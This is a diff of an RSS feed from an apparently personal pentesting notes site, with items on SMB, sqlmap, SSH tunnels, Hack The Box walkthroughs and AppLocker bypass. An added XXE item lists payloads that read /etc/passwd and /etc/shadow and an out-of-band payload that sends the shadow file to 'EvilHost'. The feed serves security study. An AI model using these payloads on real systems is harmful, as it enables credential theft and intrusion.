+Usage: smbclient service &amp;lt;password&amp;gt; -R, --name-resolve=NAME-RESOLVE-ORDER Use these name resolution services only -M, --message=HOST Send message -I, --ip-address=IP Use this IP to connect to -E, --stderr Write messages to stderr instead of stdout -L, --list=HOST Get a list of shares available on a host -m, --max-protocol=LEVEL Set the max protocol level -T, --tar=&amp;lt;c|x&amp;gt;IXFqgbNan Command line tar -D, --directory=DIR Start from directory -c, --command=STRING Execute semicolon separated commands -b, --send-buffer=BYTES Changes the transmit/send buffer -t, --timeout=SECONDS Changes the per-operation timeout -p, --port=PORT Port to connect to -g, --grepable Produce grepable output -q, --quiet Suppress help message -B, --browse Browse SMB servers using DNS Help options: -?</description>
+    </item>
+    
+    <item>
+      <title>SMB-KALI</title>
+      <link>/windows/smb/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows/smb/</guid>
+      <description>Mounting smb shares linux
+You may get an error, this means that the supporting programs aren&amp;rsquo;t there.
+sudo apt install cifs-utils -y sudo apt install nfs-common Error Message
+bad option; for several filesystems (e.g. nfs, cifs) you might need a /sbin/mount.&amp;lt;type&amp;gt; helper program. Example
+mount -o user=REPLACE &#39;//ip_addr/share&#39; /mnt/share +++
+SMBCLIENT
+Usage: smbclient service &amp;lt;password&amp;gt; -R, --name-resolve=NAME-RESOLVE-ORDER Use these name resolution services only -M, --message=HOST Send message -I, --ip-address=IP Use this IP to connect to -E, --stderr Write messages to stderr instead of stdout -L, --list=HOST Get a list of shares available on a host -m, --max-protocol=LEVEL Set the max protocol level -T, --tar=&amp;lt;c|x&amp;gt;IXFqgbNan Command line tar -D, --directory=DIR Start from directory -c, --command=STRING Execute semicolon separated commands -b, --send-buffer=BYTES Changes the transmit/send buffer -t, --timeout=SECONDS Changes the per-operation timeout -p, --port=PORT Port to connect to -g, --grepable Produce grepable output -q, --quiet Suppress help message -B, --browse Browse SMB servers using DNS Help options: -?</description>
     </item>
     
     <item>
@@ -446,7 +520,7 @@ Usage: smbclient service &amp;lt;password&amp;gt; -R, --name-resolve=NAME-RESOLV
       
       <guid>/hackthebox/boxes/sneaky/</guid>
       <description>The goal of this guide since ill be using other guides to solve it will be to learn as much as possible. There are two open ports, 80 &amp;amp; 161 on udp snmp. The webpage is under development, with a web directory that hides some content.
-nmap -sT -Pn -T5 -oA nmap/initial 10.10.10.60 -sT full tcp connection three way handshake -Pn treat ports as if they are open -T5 super speed ### 80 ### nmap -sU --top-port 1000 -oA nmap/udp 10.</description>
+nmap -sT -Pn -T5 -oA nmap/initial 10.10.10.60-sT full tcp connection three way handshake-Pn treat ports as if they are open-T5 super speed### 80 ###nmap -sU --top-port 1000 -oA nmap/udp 10.</description>
     </item>
     
     <item>
@@ -457,89 +531,7 @@ nmap -sT -Pn -T5 -oA nmap/initial 10.10.10.60 -sT full tcp connection three way 
       <guid>/webapp/sqlmap/sqlmap/</guid>
       <description>SqlMap automates finding sql-injection it can use GET or POST request. It&amp;rsquo;s pretty neat.
 In burp right click select copy to file, this will test for sql injection. pretty cool wasn&amp;rsquo;t aware it would test all the parameters. sqlmap &amp;ndash;batch -r login.req
-sqlmap --batch -u &amp;quot;http://os.htb/users/admin*&amp;quot; --level 5 --risk 3 -u url also for get request --batch run default yes --* = the parameter to fuzz --dump , --dump-all dumping sqldb to a localfile in /  </description>
-    </item>
-    
-    <item>
-      <title>TMUX</title>
-      <link>/hackthebox/tmux/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/hackthebox/tmux/</guid>
-      <description>TMUX
-okay, because my kali linux crash i had to reintall tmux. i really like gpakaosz theme pack for tmux. cd into your home directory, then create a symlink to .tmux.conf so when tmux runs it will look in you&amp;rsquo;re &amp;ldquo;home&amp;rdquo; directory in kali thats ~/ or /root/
-apt-get install tmux cd ~/ git clone ln -s .tmux/.tmux.conf -f force cp .tmux/.tmux.conf.local .  </description>
-    </item>
-    
-    <item>
-      <title>Tunnels</title>
-      <link>/linux/tunneling/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/linux/tunneling/</guid>
-      <description>SSH PORTFORWARDING
-ssh port forwarding will create &amp;ldquo;tunnels&amp;rdquo; allowing access to the network on the host. examples would be using localhost,or a private address.
-ssh user@ip_addr -L LocalPort:address_ip:HostPort  SSH BIND PORT
-Bind&amp;rsquo;s a port locally on both sides, creating a tunnel to the localhost on the victim. works with socks 4 &amp;amp; 5
-ssh -D8080 USER@IPADDRESS  Sshuttle Creates a VPN connection using the SSH protocol; forwarding all traffic to the target&amp;rsquo;s network.</description>
-    </item>
-    
-    <item>
-      <title>USER INPUT OF DOOM</title>
-      <link>/webapp/user-inputt/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/webapp/user-inputt/</guid>
-      <description>Bypassing WAFS, and other mechanism, using &amp;ldquo;Web Application hackers handbook&amp;rdquo; as my guide. We&amp;rsquo;ll break this into six sections broken authentications, broken access controls, sql injection, cross site scripting, information leakage, cross-site request forgery.
-I&amp;rsquo;ve heard good things about this book and figured doing a small writeup on it might be a fun experience.
-Bypassing BlackList - Sometimes the blacklist is literal this means it will look for SELECT, and any other iteration of select will be ignored like SelEcT.</description>
-    </item>
-    
-    <item>
-      <title>Ubuntu 18.04 Vmware Workstation 14.17</title>
-      <link>/trouble_solutions/vmware/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/trouble_solutions/vmware/</guid>
-      <description>Recently i moved from elementary to Ubuntu. migrating over to Ubuntu was a bit of a challenge, because i couldn&amp;rsquo;t Vmware to work. Vmware workstation would fail when it ran kernel-module-updater. it would fail at two points Vmware monitor and the network connection. it took about a day to find a solid answer to this.
-Below you&amp;rsquo;ll noticed allot of stuff but most of it isn&amp;rsquo;t necessary. I believe i did not play around with it much cause it works!</description>
-    </item>
-    
-    <item>
-      <title>Vault</title>
-      <link>/hackthebox/boxes/vault/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/hackthebox/boxes/vault/</guid>
-      <description>Vault Nmap showed some ephemeral ports, ssh, HTTP. Gobuster didn’t initially show anything. Tried wfuzz to check for possible subdomains nothing.
-moving on to the webpage slowdaddy webpage haaha. talks about how the webpage is under construction in the first client is sparklays. which is a real jewelry company. Gobuster was tricky append sparklays to url, and use txt,html,php extentions. I used the seclist to find the directory.
-so it turns out its not sql injections pretty happy with that.</description>
-    </item>
-    
-    <item>
-      <title>Windows</title>
-      <link>/windows/windows_enum/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/windows/windows_enum/</guid>
-      <description>/ETC/HOSTS FOR WINDOWS to change local DNS IN windows.
-notepad c:\womdpws\system32\drivers\etc\hosts  Commands
-Finding things in windows.
-find /I &amp;quot;thing&amp;quot; secrets.txt findstr &amp;quot;thing&amp;quot;  Shell preferences nishang &amp;lt; nc &amp;lt; winrm / meterpreter
-whoami /all /priv systeminfo findstr	= grep  $ExecutionContext.SessionState.LanguageMode  change password inside powershell.
-$password = read-host &amp;quot;Su-ErD;perPa$sw0rd&amp;quot; -assecurestring $useraccount = get-localuser -name &amp;quot;pinkiepie&amp;quot; $useraccount | set-localuser -password $password  os
-https://developer.microsoft.com/en-us/windows/downloads/virtual-machines
-Windows File Type for running commands scripts executables.</description>
-    </item>
-    
-    <item>
-      <title>Windows-Bypass</title>
-      <link>/concepts/bypass/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/concepts/bypass/</guid>
-      <description>I have kept running in applocker and antivirus, and CLM (constrained language mode) I would like to cover some different ways to bypass these restrictions. CLM designed to make our job harder. Basically takes away allot methods and invoke. Which means we can&amp;rsquo;t just call powerview and run in it memory. you could still download it and bypass Defender with some kind of encoding/encryption.
-CLM uses umci policy to determine what powershell scripts are approved(whitelisted).</description>
+sqlmap --batch -u &amp;quot;http://os.htb/users/admin*&amp;quot; --level 5 --risk 3-u url also for get request--batch run default yes--* = the parameter to fuzz--dump , --dump-all dumping sqldb to a localfile in /</description>
     </item>
     
     <item>
@@ -563,6 +555,102 @@ Directories private keys might be in</description>
       <description>nmap -sT -T3 -PS80,443,8000,8443,8800 -p 80,443,8000,8443,8080 -oA http-enum-results &amp;ndash;script=http-enum teacher.htb
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-24 16:27 EST Nmap scan report for teacher.htb (10.10.10.153) Host is up (0.043s latency).
 PORT STATE SERVICE 80/tcp open http | http-enum: | /css/: Potentially interesting directory w/ listing on &amp;lsquo;apache/2.4.25 (debian)&amp;rsquo; | /images/: Potentially interesting directory w/ listing on &amp;lsquo;apache/2.4.25 (debian)&amp;rsquo; | /js/: Potentially interesting directory w/ listing on &amp;lsquo;apache/2.4.25 (debian)&amp;rsquo; |_ /manual/: Potentially interesting folder</description>
+    </item>
+    
+    <item>
+      <title>TMUX</title>
+      <link>/hackthebox/tmux/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/hackthebox/tmux/</guid>
+      <description>TMUX
+okay, because my kali linux crash i had to reintall tmux. i really like gpakaosz theme pack for tmux. cd into your home directory, then create a symlink to .tmux.conf so when tmux runs it will look in you&amp;rsquo;re &amp;ldquo;home&amp;rdquo; directory in kali thats ~/ or /root/
+apt-get install tmux cd ~/ git clone ln -s .tmux/.tmux.conf -f force cp .tmux/.tmux.conf.local . </description>
+    </item>
+    
+    <item>
+      <title>Tunnels</title>
+      <link>/linux/tunneling/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/linux/tunneling/</guid>
+      <description>SSH PORTFORWARDING
+ssh port forwarding will create &amp;ldquo;tunnels&amp;rdquo; allowing access to the network on the host. examples would be using localhost,or a private address.
+ssh user@ip_addr -L LocalPort:address_ip:HostPortSSH BIND PORT
+Bind&amp;rsquo;s a port locally on both sides, creating a tunnel to the localhost on the victim. works with socks 4 &amp;amp; 5
+ssh -D8080 USER@IPADDRESSSshuttle Creates a VPN connection using the SSH protocol; forwarding all traffic to the target&amp;rsquo;s network.</description>
+    </item>
+    
+    <item>
+      <title>Ubuntu 18.04 Vmware Workstation 14.17</title>
+      <link>/trouble_solutions/vmware/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/trouble_solutions/vmware/</guid>
+      <description>Recently i moved from elementary to Ubuntu. migrating over to Ubuntu was a bit of a challenge, because i couldn&amp;rsquo;t Vmware to work. Vmware workstation would fail when it ran kernel-module-updater. it would fail at two points Vmware monitor and the network connection. it took about a day to find a solid answer to this.
+Below you&amp;rsquo;ll noticed allot of stuff but most of it isn&amp;rsquo;t necessary. I believe i did not play around with it much cause it works!</description>
+    </item>
+    
+    <item>
+      <title>USER INPUT OF DOOM</title>
+      <link>/webapp/user-inputt/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/webapp/user-inputt/</guid>
+      <description>https://portswigger.net/polls/top-10-web-hacking-techniques-2019
+Bypassing WAFS, and other mechanism, using &amp;ldquo;Web Application hackers handbook&amp;rdquo; as my guide. We&amp;rsquo;ll break this into six sections broken authentications, broken access controls, sql injection, cross site scripting, information leakage, cross-site request forgery.
+I&amp;rsquo;ve heard good things about this book and figured doing a small writeup on it might be a fun experience.
+Bypassing BlackList - Sometimes the blacklist is literal this means it will look for SELECT, and any other iteration of select will be ignored like SelEcT.</description>
+    </item>
+    
+    <item>
+      <title>Vault</title>
+      <link>/hackthebox/boxes/vault/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/hackthebox/boxes/vault/</guid>
+      <description>Vault Nmap showed some ephemeral ports, ssh, HTTP. Gobuster didn’t initially show anything. Tried wfuzz to check for possible subdomains nothing.
+moving on to the webpage slowdaddy webpage haaha. talks about how the webpage is under construction in the first client is sparklays. which is a real jewelry company. Gobuster was tricky append sparklays to url, and use txt,html,php extentions. I used the seclist to find the directory.
+so it turns out its not sql injections pretty happy with that.</description>
+    </item>
+    
+    <item>
+      <title>Windows</title>
+      <link>/windows/windows_enum/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows/windows_enum/</guid>
+      <description>/ETC/HOSTS FOR WINDOWS to change local DNSIN windows.
+notepad c:\womdpws\system32\drivers\etc\hosts Commands
+Finding things in windows.
+find /I &amp;quot;thing&amp;quot; secrets.txt findstr &amp;quot;thing&amp;quot; Shell preferences nishang &amp;lt; nc &amp;lt; winrm / meterpreter
+whoami /all /priv systeminfo findstr	= grep $ExecutionContext.SessionState.LanguageMode change password inside powershell.
+$password = read-host &amp;quot;Su-ErD;perPa$sw0rd&amp;quot; -assecurestring $useraccount = get-localuser -name &amp;quot;pinkiepie&amp;quot; $useraccount | set-localuser -password $password os
+https://developer.microsoft.com/en-us/windows/downloads/virtual-machines
+Windows File Type for running commands scripts executables. I found this list looking up applocker policies.</description>
+    </item>
+    
+    <item>
+      <title>Windows-Bypass</title>
+      <link>/concepts/bypass/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/concepts/bypass/</guid>
+      <description>I have kept running in applocker and antivirus, and CLM (constrained language mode) I would like to cover some different ways to bypass these restrictions. CLM designed to make our job harder. Basically takes away allot methods and invoke. Which means we can&amp;rsquo;t just call powerview and run in it memory. you could still download it and bypass Defender with some kind of encoding/encryption.
+CLM uses umci policy to determine what powershell scripts are approved(whitelisted).</description>
+    </item>
+    
+    <item>
+      <title>XXE</title>
+      <link>/webapp/xxe/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/webapp/xxe/</guid>
+      <description>Description
+Payloads
+&amp;lt;%3fxml+version%3d&amp;quot;1.0&amp;quot;+%3f&amp;gt;&amp;lt;!DOCTYPE+r+[&amp;lt;!ELEMENT+r+ANY&amp;gt;&amp;lt;!ENTITY+sp+SYSTEM+&amp;quot;http%3a//kart.finn.no&amp;quot;&amp;gt;]&amp;gt;&amp;lt;r&amp;gt;%26sp%3b&amp;lt;/r&amp;gt; &amp;lt;?xml version=&amp;quot;1.0&amp;quot; ?&amp;gt; &amp;lt;!DOCTYPE r [ &amp;lt;!ELEMENT r ANY &amp;gt; &amp;lt;!ENTITY sp SYSTEM &amp;quot;http://x.x.x.x:443/test.txt&amp;quot;&amp;gt; ]&amp;gt; &amp;lt;r&amp;gt;&amp;amp;sp;&amp;lt;/r&amp;gt; &amp;lt;%3fxml+version%3d&amp;quot;1.0&amp;quot;+encoding%3d&amp;quot;ISO-8859-1&amp;quot;%3f&amp;gt;&amp;lt;!DOCTYPE+foo+[++&amp;lt;!ELEMENT+foo+ANY+&amp;gt;&amp;lt;!ENTITY+xxe+SYSTEM+&amp;quot;file%3a///etc/passwd&amp;quot;+&amp;gt;]&amp;gt;&amp;lt;foo&amp;gt;%26xxe%3b&amp;lt;/foo&amp;gt; &amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;ISO-8859-1&amp;quot;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ELEMENT foo ANY &amp;gt; &amp;lt;!ENTITY xxe SYSTEM &amp;quot;file:///etc/passwd&amp;quot; &amp;gt;]&amp;gt;&amp;lt;foo&amp;gt;&amp;amp;xxe;&amp;lt;/foo&amp;gt; oob extraction
+&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt; &amp;lt;!DOCTYPE r [ &amp;lt;!ENTITY % data3 SYSTEM &amp;quot;file:///etc/shadow&amp;quot;&amp;gt; &amp;lt;!ENTITY % sp SYSTEM &amp;quot;http://EvilHost:port/sp.dtd&amp;quot;&amp;gt; %sp; %param3; %exfil; ]&amp;gt; ## External dtd: ## &amp;lt;!ENTITY % param3 &amp;quot;&amp;lt;!ENTITY &amp;amp;#x25; exfil SYSTEM &#39;ftp://Evilhost:port/%data3;&#39;&amp;gt;&amp;quot;&amp;gt; soap
+&amp;lt;soap%3aBody&amp;gt;&amp;lt;foo&amp;gt;&amp;lt;![CDATA[&amp;lt;!DOCTYPE+doc+[&amp;lt;!ENTITY+%25+dtd+SYSTEM+&amp;quot;https%3a//kart.finn.no/&amp;quot;&amp;gt;+%25dtd%3b]&amp;gt;&amp;lt;xxx/&amp;gt;]]&amp;gt;&amp;lt;/foo&amp;gt;&amp;lt;/soap%3aBody&amp;gt; XML XXE</description>
     </item>
     
   </channel>
